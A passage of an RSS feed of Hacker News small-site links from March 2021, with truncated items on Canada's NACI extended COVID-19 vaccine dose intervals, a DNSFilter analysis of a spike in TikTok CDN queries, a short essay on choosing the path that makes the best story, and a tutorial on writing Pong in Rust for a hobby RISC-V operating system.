<p>NACI reviewed available evidence in full Committee meetings (February 8, 2021; February 24-25, 2021) and Working Group meetings (February 19, 2021) on extended intervals for COVID-19 vaccines. This included evidence available from published peer-review studies, pre-prints, and data available from population-based assessments from within and outside of Canada. On March 1, 2021, NACI voted on and approved the revised recommendations by majority. Due to the urgency for provinces and territories to consider implementing extended dose intervals, NACI is providing an abridged rationale in this document. The complete analysis, including more detailed evidence summaries and references, will be provided in coming weeks as the NACI evergreen guideline is updated online in the <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/recommendations-use-covid-19-vaccines.html">Recommendations on the use of COVID-19 vaccines</a>.</p>
<h2 id="a5">Recommendations</h2>
<p>Based on emerging evidence of the protection provided by the first dose of a two dose series for COVID-19 vaccines currently authorized in Canada, NACI recommends that in the context of limited COVID-19 vaccine supply jurisdictions should maximize the number of individuals benefiting from the first dose of vaccine by extending the second dose of COVID-19 vaccine up to four months after the first. NACI will continue to monitor the evidence on effectiveness of an extended dose interval and will adjust recommendations as needed. <strong>(Strong NACI Recommendation)</strong></p>
<ul>
	<li>In addition to emerging population-based data, this recommendation is based on expert opinion and the public health principles of equity, ethics, accessibility, feasibility, immunological vaccine principles, and the perspective that, within a global pandemic setting, reducing the risk of severe disease outcomes at the population-level will have the greatest impact. Current evidence suggests high vaccine effectiveness against symptomatic disease and hospitalization for several weeks after the first dose, including among older populations.</li>
	<li>This recommendation applies to all COVID-19 vaccines currently authorized for use in Canada.</li>
	<li>In situations where informed consent included assumptions about second dose timing, jurisdictions may consider offering second doses at shorter intervals for those who provided consent for the vaccine series prior to this recommendation.</li>
	<li>The vaccine effectiveness of the first dose will be monitored closely and the decision to delay the second dose will be continuously assessed based on surveillance and effectiveness data and post-implementation study designs. Effectiveness against variants of concern will also be monitored closely, and recommendations may need to be revised.</li>
</ul>
<p>Please note:</p>
<ul>
	<li>A&nbsp;<strong>strong recommendation</strong>&nbsp;applies to most populations/individuals and should be followed unless a clear and compelling rationale for an alternative approach is present.</li>
	<li>A&nbsp;<strong>discretionary recommendation</strong>&nbsp;may be offered for some populations/individuals in some circumstances. Alternative approaches may be reasonable.</li>
</ul>
<h2 id="a6">Summary of rationale</h2>
<p>Due to the urgency for provinces and territories to consider implementing extended dose intervals, NACI is providing an abridged rationale in this document. The complete analysis, including more detailed evidence summaries and references, will be provided in coming weeks as the NACI evergreen guideline is updated online in the <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/recommendations-use-covid-19-vaccines.html">Recommendations on the use of COVID-19 vaccines</a>.</p>
<h3 id="a6.1">Protecting individuals</h3>
<ul>
	<li>By implementing an extended four month interval strategy, Canada will be able to provide access to first doses of highly efficacious vaccines to more individuals earlier which is expected to increase health equity faster. Canada has secured enough vaccines to ensure that a second dose will be available to every adult.</li>
	<li>As a general vaccination principle, interruption of a vaccine series resulting in an extended interval between doses does not require restarting the vaccine series. Principles of immunology, vaccine science, and historical examples demonstrate that delays between doses do not result in a reduction in final antibody concentrations nor a reduction in durability of memory response for most multi-dose products.</li>
	<li><strong>Assessment of available data on efficacy and effectiveness</strong> of a single dose of mRNA vaccine was a critical factor in assessing the impact of a delayed second dose at this time. The two available clinical trials for mRNA vaccines (Pfizer-BioNTech and Moderna) provide evidence that indicates that efficacy against symptomatic disease begins as early as 12 to 14 days after the first dose of the mRNA vaccine. Excluding the first 14 days before vaccines are expected to offer protection, both vaccines showed an efficacy of 92% up until the second dose (most second doses were administered at 19-42 days in the trials). Recently, real world vaccine effectiveness data presented to or reviewed by NACI assessing PCR-positive COVID-19 disease and/or infection from Quebec, British Columbia, Israel, the United Kingdom and the United States support good effectiveness (generally 70-80%, depending on the methodology used and outcomes assessed) from …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html">https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html</a></em></p>]]>
            </description>
            <link>https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360556</guid>
            <pubDate>Fri, 05 Mar 2021 18:58:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Next Generation Website Builder]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26360542">thread link</a>) | @okozzie
<br/>
March 5, 2021 | https://straw.page/start | <a href="https://web.archive.org/web/*/https://straw.page/start">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://straw.page/start</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360542</guid>
            <pubDate>Fri, 05 Mar 2021 18:57:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TikTok Popularity Growth or New Feature Increasing DNS Queries?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26360222">thread link</a>) | @serenadns
<br/>
March 5, 2021 | https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news | <a href="https://web.archive.org/web/*/https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>TikTok has been <a href="https://brandastic.com/blog/what-is-tiktok-and-why-is-it-so-popular/#:~:text=The%20TikTok%20app%20has%20been,123%20million%20from%20the%20U.S.&amp;text=Bytedance%20the%20company%20that%20owns,the%20world's%20most%20valuable%20startup%20.">growing in popularity</a> steadily since 2019 despite <a href="https://threatpost.com/tik-tok-ban-security-experts-dangers/159362/#:~:text=In%20fact%2C%20Comparitech%20evaluated%20TikTok,advocate%20with%20Comparitech%2C%20told%20Threatpost.">concerns over its security</a> in the US. It’s been <a href="https://www.oberlo.com/blog/tiktok-statistics#:~:text=The%20TikTok%20app%20has%20been,more%20than%2033%20million%20downloads.">downloaded over <strong>2 billion times</strong></a> and hit <a href="https://wallaroomedia.com/blog/social-media/tiktok-statistics/#:~:text=Monthly%20Active%20Users%20%E2%80%93%20TikTok%20has,of%20now%20(February%202021).">1 billion active monthly users</a> as of February 2021. For context, competitor app Instagram (owned by Facebook) had 1 billion active monthly users <a href="https://www.statista.com/statistics/253577/number-of-monthly-active-instagram-users/">back in 2018</a>. And TikTok seems poised to take the No. 1 spot in 2021.<br></p><p>We’ve been monitoring the growth of TikTok popularity on our network, as we’re curious about the app’s increased usage. DNSFilter is a product used primarily by other businesses, so we’ve been surprised by the use of TikTok on corporate networks.&nbsp;<br></p><p>In March 2020, TikTok DNS queries accounted for under .5% of our entire network traffic. By the end of July, it made up 1.3% of our network traffic—that was a 7x increase when looking at the number of queries. To put this into perspective, the entire <strong><em>category</em></strong> of shopping sites on our network at the end of July 2020 made up <strong>2% of our entire network</strong>.<br></p><p>I should note: There are over 14,000 companies that route their traffic through DNSFilter and we see roughly 12 billion DNS queries daily. So while our network does not allow us to view internet traffic as a whole, we <em>are</em> able to see overall trends.&nbsp;<br></p><p>In early February 2021, we noticed another major spike in traffic to TikTok:</p><figure><p><img src="https://assets.website-files.com/5fda06d4fe4b4ba14ad334dc/604123432b07fa4bdec5385d_001h98GlCeJ2zwmnM1537Jf45q3Nty7WJCs91SYRWk34DgJuzYh9ssiI2mWZujOvTtGJAgxN7g0BfP809muA0Xrn3NxavqgdCR8qQxaBvGrYR8TvMtSB9LcDF4oFL87TMsRv9jsy.png" alt=""></p></figure><p>Prior to February 3, our network was resolving around 6.3 million TikTok queries daily (that number had held relatively steady since July 2020). The day of the spike, we saw 11.96 million queries. And as of February 25, we’ve seen as high as <em>15.15 million queries</em> in a day.<br></p><p>This made us ask the question: Did TikTok <em>really</em> see a 100% increase in traffic overnight? Or is there something else happening?</p><h2>Many domains, one application</h2><p>Before we go any further, I want to explain why one application is usually comprised of more than one domain. Applications like TikTok don’t use a single domain for all of the content on their service. Under the TikTok umbrella, there might be <em>hundreds</em> of domains.<br></p><p>The reason for all of these domains varies. One domain might be responsible for the TikTok site content, as in tiktok.com. Another domain might be a Content Delivery Network (CDN), a place to host files (such as the video content users host) that the application then “calls” for when someone wants to view that content. And then there might be service domains to host API endpoints.&nbsp;<br></p><p>Depending on their setup, they may use different hostnames for geographic scaling or simply as a method of distributing load. Not all applications do it this way, but it is one possibility. Doing it this way would mean those 1.5 billion TikTok users are served different domains based on their geolocation.</p><p>The ability to block and allow entire applications (as opposed to individual domains) is actually something we’re working on at DNSFilter and part of why we were able to identify this TikTok growth in the first place. <a href="https://dnsfilter.canny.io/feature-requests/p/additional-quick-lists-for-easy-blocking-of-popular-services">Keep an eye on our roadmap for updates</a>.</p><h2>Researching TikTok’s domain growth: Real or not?</h2><p>There is no doubt that starting February 3 there were more DNS queries accessing TikTok. The question is: What is the purpose of these queries?<br></p><p>Were these additional queries generated by users who are just using the site more? Were these queries initiated by <strong><em>TikTok </em></strong>or another service that uses them?&nbsp;<br></p><p>So with that, Domain Intelligence Lead Peter Lowe and I started digging into these questions.<br></p><p>Before looking into the actual queries, we first wanted to rule out any changes to <strong>caching</strong> or <strong>TTL</strong> (time to live). TTL is the lifespan of how long a domain name record is cached for. If the TTL has a shorter time out period, it will look like there are more requests to a domain. However, this didn’t seem to be the case for TikTok.<br></p><p>Next, we looked at the queries themselves. Of the domains under the umbrella of the TikTok application, which ones were requested the most?<br></p><p>Here, we got a clear answer: tiktokcdn[dot]com was responsible for this large spike in traffic. Here’s a comparison of the main TikTok domain to the tiktokcdn domain:</p><figure><p><img src="https://assets.website-files.com/5fda06d4fe4b4ba14ad334dc/60412343fa7329ac84611b92_MQn0NsNR2PuWFBiRM-XJzDCc3BL3ZO-NEUMAc4D8nNJA986opKzDc18v9RHs8gORhORGui3sKjAU0RfJxW1NkCHX8W0g5oZeZbAbM9moIHDcqPkyOwNR7pjGlXXkft3ZqV690HDy.png" alt=""></p></figure><p>This domain was <strong><em>single handedly</em></strong> responsible for the spike in DNS queries.<br></p><p>Now that we knew the main domain making these queries, we could do a comparison between February 3 (the day of the spike) and January 27 (one week before). The reason we’d look at one week before as opposed to the day before is that domain queries generally tend to follow a pattern based on the day of the week. This way, we’re comparing apples to apples (or Wednesdays to Wednesdays).&nbsp;<br></p><p>We compared the total number of organizations and networks that accessed TikTok during this time—the numbers were essentially the same. In fact, January 27 actually had a few <em>more</em> organizations (and networks) connecting to TikTok than February 3.<br></p><p>Definitively, this spike was <em>not</em> based on new usage. It is based on new <em>queries</em>.<br></p><p>That this domain literally includes “CDN” in its name tells us it’s very likely a CDN domain. Though we can’t rule out that TikTok’s domain naming convention is purposefully meant to conceal the actual goal of the domain—but I promise we won’t get into conspiracy theories today.<br></p><p>Going with the assumption that this tiktokcdn[dot]com domain is <em>actually</em> a CDN domain where static files are hosted by TikTok, this still doesn’t answer the question of <em>who</em> is initiating these queries. An increase in CDN queries could mean users are suddenly requesting the same content as before (just more often), that the app itself is requesting content more frequently, or that another service (possibly owned by TikTok) is now using TikTok domains to serve content.<br></p><p>If you’re wondering how that third option would work, I’ll use the app <a href="https://www.goodreads.com/">Goodreads</a> as an example. Goodreads is owned by Amazon. When I open up my Goodreads app and then look in DNSFilter’s query log, I’ll see that I’ve accessed domains containing both “goodreads” and “amazon” in the domain names. In fact, in just a few minutes of clicking through my Goodreads history within the app, the application generates roughly 40 DNS queries: 32 of them include “Amazon” in the domain or subdomain name and only 8 actually include “Goodreads.”&nbsp;</p><h2>What happened on February 3?</h2><p>Our CEO, Ken Carnesi, is the one who first noticed the TikTok spike. He also found that on February 3 TikTok released an update. The only context he could find in the release notes for <a href="https://appmagic.rocks/ipad/tiktok/835599320/info?metrics=top_free">TikTok version 18.5.0</a> was a single line: “Share your favorite effects with friends.”<br></p><p>Could the purpose of these new queries be tied to this new “share your favorite effects” feature?&nbsp;<br></p><p>But there was another TikTok update on the same day that got a little more attention. <a href="https://newsroom.tiktok.com/en-us/new-prompts-to-help-people-consider-before-they-share">This&nbsp; particular update</a> was all about flagging unsubstantiated content to help fight fake news—something that’s been plaguing social platforms in recent years. According to TikTok, sometimes fact checks on videos that are flagged as misinformation are inconclusive. Rather than take the content down the content in question, TikTok released a new banner that would appear on possibly misleading information with the warning: “Caution: Video flagged for unverified content.”</p><figure><p><img src="https://assets.website-files.com/5fda06d4fe4b4ba14ad334dc/60412343d9397424fe443e00_g8ju0AT2WmSJHO86y1urHGBRES50rZV7NcUEdM6rZf-6lY8o8yL0OYtzXgRTVGwEaalgrtYi8MWla8Wan9YODAoH04-4cudgcinKRNTto50XztKz41lRTqiHM_QqfWMWuVhjAuLw.png" alt=""></p></figure><p>This new feature would alert content creators who receive a warning label on their video, load a warning label over said video, and if a user were to share a video they would be prompted with a message asking “Are you sure you want to share this video?”<br></p><p>All of these changes within the app would likely be served by a CDN. Next up was to test our hypothesis that one of these updates was linked to the increase in DNS queries.</p><h2>How many queries does TikTok generate?</h2><p>Applications generate a lot of queries.&nbsp;<br></p><p>Browsing on Instagram for 5 minutes can generate upwards of 300 queries—especially if you’re searching for new content. Applications like Fitbit run in the background and send queries regularly. While browsing Instagram for 5 minutes, Fitbit will likely send 4 DNS queries. And after just a minute of using the Fitbit app, I found nearly 100 queries in the DNSFilter query log.<br></p><p>Fitbit generates more queries than Instagram because it’s using DNS to lookup server IPs it's constantly sending data to, from my Fitbit device and app. Instagram might need to communicate with servers where files are hosted, but otherwise it’s not sending DNS queries to external devices.<br></p><p>Between 1:30 - 4:00, I had TikTok downloaded on my phone. In that time, I generated nearly 2,000 DNS queries—76% of them included “CDN” in the domain name.<br></p><p>But this isn’t that rare. Of the Fitbit queries I mentioned earlier, 73% of them were CDN domains. And 77% of the Instagram domain queries were CDN domains.<br></p><p>To dive into where these CDN queries were most active, I tracked usage across the app and would spent a period of time performing a single action. These were:<br></p><ul role="list"><li>Scrolled through recommended videos</li><li>Used the search feature</li><li>Flagged videos as misinformation</li><li>Clicked on videos with some type of warning</li><li>Favorited effects<br></li></ul><p>Of all of these actions, favoriting filters and sounds connected to CDN domains more than the rest—92% of queries during the period I favorited those items were CDN domains. Surprisingly, flagging misinformation and clicking on videos with warning resulted in the lowest number of CDN queries.</p><h2>What could be driving TikTok queries?</h2><p>Based on the CDN usage of just <em>favoriting</em> effects, it seems reasonable that sharing the effect would generate a large number of DNS queries. Considering there was an update on February 3, it’s possible that update is causing this prolonged spike in queries because it needs to communicate with CDN servers more often.<br></p><p>But we still have other theories.<br></p><p>Because the total number of DNS queries generated by TikTok and its competitor Instagram are similar (browsing TikTok for 5 minutes generated 196 queries while browsing Instagram generated 258), I think it’s possible that there is an <em>external</em> application using the tiktokcdn[dot]com domain. This could be a sister app of TikTok’s, like <a href="https://www.douyin.com/">Douyin</a>, or it could be another service that’s enabling users to post TikTok videos. In both cases, they’d need to refer to TikTok’s CDN servers.<br></p><p>Peter …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news">https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news</a></em></p>]]>
            </description>
            <link>https://www.dnsfilter.com/blog/tiktok-popularity-or-fake-news</link>
            <guid isPermaLink="false">hacker-news-small-sites-26360222</guid>
            <pubDate>Fri, 05 Mar 2021 18:36:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Do What Makes the Best Story]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 55 (<a href="https://news.ycombinator.com/item?id=26359378">thread link</a>) | @tosh
<br/>
March 5, 2021 | https://amasad.me/story | <a href="https://web.archive.org/web/*/https://amasad.me/story">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Kids are always telling themselves stories. Try to remember yourself as a child lying in bed, anticipating an exciting day tomorrow, and you'll probably remember telling yourself a story about how cool it's going to be, who's going to be there, and how much fun you'll have. Self storytelling might be more pronounced in kids -- they like to say it out loud -- but it never goes away and only subsides to the background in adults. Self storytelling is so essential for people that one of the most effective <a href="https://en.wikipedia.org/wiki/Cognitive_behavioral_therapy">techniques</a> for treating depression and anxiety boils down to "tell yourself better stories." </p>
<p>Life is also a form of self storytelling. We're continually retelling ourselves our life story, but very few people think of themselves as authors of their story, not mere subjects. People with extraordinary high-agency realize this early in life and start maximizing the interestingness of their life story.</p>
<p>Having a fascinating life story is not just an exercise in vanity -- it has a real impact on your success in life. You'll have an easier time attracting friends as well as life and business partners. It'll also make it much easier to sell yourself or your products. It has a kind of compounding <a href="https://en.wikipedia.org/wiki/Halo_effect">halo effect</a>.</p>
<p>Startups also have to be good stories. A good business idea or market is not enough to endure the pain and have the motivation to get a startup off the ground. Without an interesting story about the founding of the company and the vision, you'll have a hard time attracting talent and money. Notice how the most successful startups in the world all have remarkable genesis stories. </p>
<p>So next time you're faced with a tough decision, consider the path that makes a more interesting story. If it turned out to be the wrong decision to have made, you'd at least be fun at dinner parties.</p>

          </div></div>]]>
            </description>
            <link>https://amasad.me/story</link>
            <guid isPermaLink="false">hacker-news-small-sites-26359378</guid>
            <pubDate>Fri, 05 Mar 2021 17:26:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Pong in Rust for My OS Written in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26358959">thread link</a>) | @azhenley
<br/>
March 5, 2021 | https://blog.stephenmarz.com/2021/02/22/writing-pong-in-rust/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2021/02/22/writing-pong-in-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>This post is part of a larger effort you can view over here: <a href="https://osblog.stephenmarz.com/">https://osblog.stephenmarz.com</a>.</p>



<div><figure><img loading="lazy" width="640" height="480" src="https://blog.stephenmarz.com/wp-content/uploads/2021/02/pong_rust-1.gif" alt=""><figcaption>Pong being played on my custom, RISC-V OS in Rust!</figcaption></figure></div>



<h2>Video</h2>



<figure><p>
<iframe title="OSBlog - Writing Pong" width="900" height="506" src="https://www.youtube.com/embed/PxWd3E_C6VI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<h2>Contents</h2>



<ol><li><a href="#overview">Overview</a></li><li><a href="#api">Application Programmer’s Interface (API)</a></li><li><a href="#starting_routines">Starting Routines</a></li><li><a href="#system_calls">System Calls</a></li><li><a href="#drawing_primitives">Drawing Primitives</a></li><li><a href="#event_handling">Event Handling</a></li><li><a href="#start_our_game">Start Our Game</a></li><li><a href="#game_loop">Game Loop</a></li><li><a href="#play">PLAY</a></li></ol>



<hr>



<h2 id="overview">Overview</h2>



<p>We last left off writing a graphics driver and an event driver for our operating system. We also added several system calls to handle drawing primitives as well as handling keyboard and mouse inputs. We are now going to use those to animate the simple game of <em>pong</em>. Just like hello world is the test of every programming language, pong is a test of all of our graphics and event systems.</p>



<hr>



<h2 id="api">Application Programmer’s Interface (API)</h2>



<p>Since we’re writing in user space, we need to use the system calls we developed to (1) enumerate the framebuffer, (2) invalidate sections of the framebuffer, (3) read keyboard/click events, and (4) read motion events–mouse or tablet.</p>



<p>For Rust, we are still using the riscv64gc-unknown-none-elf target, which doesn’t contain a runtime. Now, riscv64gc-unknown-linux-gnu does exist, however it uses Linux system calls, which we haven’t implemented, yet. So, we are required to create our own system call interface as well as runtime!</p>



<hr>



<h2 id="starting_routines">Starting Routines</h2>



<p>Many programmers know that ELF allows our entry point to start anywhere. However, most linkers will look for a symbol called _start. So, in Rust, we have to create this symbol. Unfortunately, after many attempts, I could not get it to work fully in Rust. So, instead, I used the global_asm! macro to import an assembly file. All it does is call main and invokes the <em>exit</em> system call when main returns.</p>



<pre data-enlighter-language="asm" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">.section .text.init
.global _start
_start:
.option push
.option norelax
	la	gp, __global_pointer$
.option pop
	li		a0, 0
	li		a1, 0
	call	main
	# Exit system call after main
	li	a7, 93
	ecall
.type _start, function
.size _start, .-_start</pre>



<p>I did fail to mention about the global pointer. Since global variables can be stored far away, we use a register to store the top of this location. Luckily, most linkers have a symbol called __global_pointer$ (yes, even with the $) that we put into the gp (global pointer) register. I’m not going to cover relaxation, but this is necessary.</p>



<p>This is all that we need to get into Rust. However, since we’re still in baremetal Rust, we have to define the same symbols we did for our OS, including the panic and abort handlers.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#![no_std]
#![feature(asm, panic_info_message, lang_items, start, global_asm)]

#[lang = "eh_personality"]
extern "C" fn eh_personality() {}

#[panic_handler]
fn panic(info: &amp;core::panic::PanicInfo) -&gt; ! {
	print!("Aborting: ");
	if let Some(p) = info.location() {
		println!("line {}, file {}: {}", p.line(), p.file(), info.message().unwrap());
	} else {
		println!("no information available.");
	}
	abort();
}
#[no_mangle]
extern "C" fn abort() -&gt; ! {
	loop {
		unsafe {
			asm!("wfi");
		}
	}
}
</pre>



<p>This allows our code to at least compile, but as you can see we need to import the assembly file as well as define a main.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">global_asm!(include_str!("start.S"));
#[start]
fn main(_argc: isize, _argv: *const *const u8) -&gt; isize {
    0
}</pre>



<p>Now we have an entry point for Rust. Now, we can create the println and print macros to make Rust be more Rusty for us.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[macro_export]
macro_rules! print
{
	($($args:tt)+) =&gt; ({
			use core::fmt::Write;
			let _ = write!(crate::syscall::Writer, $($args)+);
			});
}
#[macro_export]
macro_rules! println
{
	() =&gt; ({
		   print!("\r\n")
		   });
	($fmt:expr) =&gt; ({
			print!(concat!($fmt, "\r\n"))
			});
	($fmt:expr, $($args:tt)+) =&gt; ({
			print!(concat!($fmt, "\r\n"), $($args)+)
			});
}
</pre>



<hr>



<h2 id="system_calls">System Calls</h2>



<p>We need to create an API for system calls, since that will be how we get and put certain data to our operating system. Generally, the runtime will establish this for us, but again, we’re in baremetal Rust.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">use core::fmt::{Write, Error};
use crate::event::Event;

pub struct Writer;

impl Write for Writer {
	fn write_str(&amp;mut self, out: &amp;str) -&gt; Result&lt;(), Error&gt; {
		for c in out.bytes() {
			putchar(c);
		}
		Ok(())
	}
}

pub fn putchar(c: u8) -&gt; usize {
    syscall(2, c as usize, 0, 0, 0, 0, 0, 0)
}

pub fn sleep(tm: usize) {
    let _ = syscall(10, tm, 0, 0, 0, 0, 0, 0);
}

pub fn get_fb(which_fb: usize) -&gt; usize {
    syscall(1000, which_fb, 0, 0, 0, 0, 0, 0)
}

pub fn inv_rect(d: usize, x: usize, y: usize, w: usize, h: usize) {
    let _ = syscall(1001, d, x, y, w, h, 0, 0);
} 

pub fn get_keys(x: *mut Event, y: usize) -&gt; usize {	
    syscall(1002, x as usize, y, 0, 0, 0, 0, 0)
}

pub fn get_abs(x: *mut Event, y: usize) -&gt; usize {	
    syscall(1004, x as usize, y, 0, 0, 0, 0, 0)
}

pub fn get_time() -&gt; usize {
     syscall(1062, 0, 0, 0, 0, 0, 0, 0)
}

pub fn syscall(sysno: usize, a0: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -&gt; usize {
    let ret;
    unsafe {
    asm!("ecall",
        in ("a7") sysno,
        in ("a0") a0,
        in ("a1") a1,
        in ("a2") a2,
        in ("a3") a3,
        in ("a4") a4,
        in ("a5") a5,
        in ("a6") a6,
        lateout("a0") ret);
    }
    ret
}
</pre>



<p>MAN, I love the new Rust asm! It is very clear what’s happening when you look at it. Usually when I use inline assembly, register selection is extremely important. This makes it rather foolproof–dare I actually say that?</p>



<p>Just like we did for our operating system, we use the Write trait to hook into the format macro that is given to us by Rust.</p>



<hr>



<h2 id="drawing_primitives">Drawing Primitives</h2>



<p>Ok, with the system calls and the startup code in start.S, we now have everything we need to start programming the game. So, let’s make some drawing primitives. Since this is pong, we only really care about drawing rectangles.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(C)]
#[derive(Clone,Copy)]
pub struct Pixel {
    pub r: u8,
    pub g: u8,
    pub b: u8,
    pub a: u8,
}

pub type Color = Pixel;

impl Pixel {
    pub fn new(r: u8, g: u8, b: u8) -&gt; Self {
        Self {
            r, g, b, a: 255
        }
    }
}

pub struct Vector {
    pub x: i32,
    pub y: i32
}

impl Vector {
    pub fn new(x: i32, y: i32) -&gt; Self {
        Self {
            x,  y
        }
    }
}

pub struct Rectangle {
    pub x: i32,
    pub y: i32,
    pub width: i32,
    pub height: i32,
}

impl Rectangle {
    pub fn new(x: i32, y: i32, width: i32, height: i32) -&gt; Self {
        Self {
            x, y, width, height
        }
    }
}
pub struct Framebuffer {
    pixels: *mut Pixel
}

impl Framebuffer {
    pub fn new(pixels: *mut Pixel) -&gt; Self {
        Self { pixels }
    }
    pub fn set(&amp;mut self, x: i32, y: i32, pixel: &amp;Pixel) {
        unsafe {
            if x &lt; 640 &amp;&amp; y &lt; 480 {
                let v = (y * 640 + x) as isize;
                self.pixels.offset(v).write(*pixel);
            }
        }
    }
    pub fn fill_rect(&amp;mut self, rect: &amp;Rectangle, color: &amp;Pixel) {
        let row_start = rect.y;
        let row_finish = row_start + rect.height;
        let col_start = rect.x;
        let col_finish = col_start + rect.width;
        for row in row_start..row_finish {
            for col in col_start..col_finish {
                self.set(col, row, color);
            }
        }
    }
}

pub fn lerp(value: i32, mx1: i32, mx2: i32) -&gt; i32 {
    let r = (value as f64) / (mx1 as f64);
	return r as i32 * mx2;
}</pre>



<p>Now we have a pixel structure, a vector, a rectangle, and a framebuffer. The pixel comes from the operating system, so it is important that we control that structure, which necessitates #[repr(C)].</p>



<hr>



<h2 id="event_handling">Event Handling</h2>



<p>We can draw, so now we need to be able to handle input. We can create an event structure to handle this.</p>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#[repr(C)]
#[derive(Copy, Clone)]
pub struct Event {
    pub event_type: u16,
	pub code: u16,
	pub value: u32
} 

impl Event {
	pub fn empty() -&gt; Self {
		Self {
			event_type: 0,
			code: 0,
			value: 0
		}
	}
	pub fn new(event_type: u16, code: u16, value: u32) -&gt; Self {
		Self {
			event_type,
			code,
			value
		}
	}
}

// Key codes
pub const KEY_RESERVED: u16 = 0;
pub const KEY_ESC: u16 = 1;
pub const KEY_1: u16 = 2;
pub const KEY_2: u16 = 3;
// ... CLIP ...
pub const KEY_END: u16 = 107;
pub const KEY_DOWN: u16 = 108;

// mouse buttons

pub const BTN_MOUSE: u16 = 0x110;
pub const BTN_LEFT: u16 = 0x110;
pub const BTN_RIGHT: u16 = 0x111;
pub const BTN_MIDDLE: u16 = 0x112;


// mouse movement

pub const ABS_X: u16 = 0x00;
pub const ABS_Y: u16 = 0x01;
pub const ABS_Z: u16 = 0x02;

</pre>



<p>Many of the constants came from libevdev’s input-event-codes.h. Unfortunately, that’s in C, so a little Python script could make it Rust. </p>



<p>Just like the Pixel structure, the Event structure is defined by our operating system, so we are required to control it ourselves (hence #[repr(C)]).</p>



<hr>



<h2 id="start_our_game">Start Our Game</h2>



<pre data-enlighter-language="rust" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const MAX_EVENTS: usize = 25;
const GAME_FRAME_TIMER: usize = 1000;

#[start]
fn main(_argc: isize, _argv: *const *const u8) -&gt; isize {
	use drawing::Framebuffer;
	use drawing::Pixel;

	let ufb = syscall::get_fb(6) as *mut Pixel;
	let mut fb = Framebuffer::new(ufb);
	let background_color = drawing::Pixel::new(25, 36, 100);
	let mut event_list = [event::Event::empty(); MAX_EVENTS];
	let event_list_ptr = event_list.as_mut_ptr();

	let player_color = drawing::Pixel::new(255, 0, 0);
	let npc_color = drawing::Pixel::new(0, 255, 0);
	let ball_color = drawing::Pixel::new(255, 255, 255);

	let mut game = pong::Pong::new(player_color, npc_color, ball_color, background_color);
	// GAME LOOP HERE
	println!("Goodbye :)");
	0
}</pre>



<p>You can see the first thing we do is grab a framebuffer. If you recall from the operating system tutorial, our operating system will map the pixels into our application’s memory space. We can update the pixels as we see fit, but to actually realize it on the screen, we must <em>invalidate</em> the given pixels, which is a separate system call in our OS.</p>



<p>You can see we have a …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2021/02/22/writing-pong-in-rust/">https://blog.stephenmarz.com/2021/02/22/writing-pong-in-rust/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2021/02/22/writing-pong-in-rust/</link>
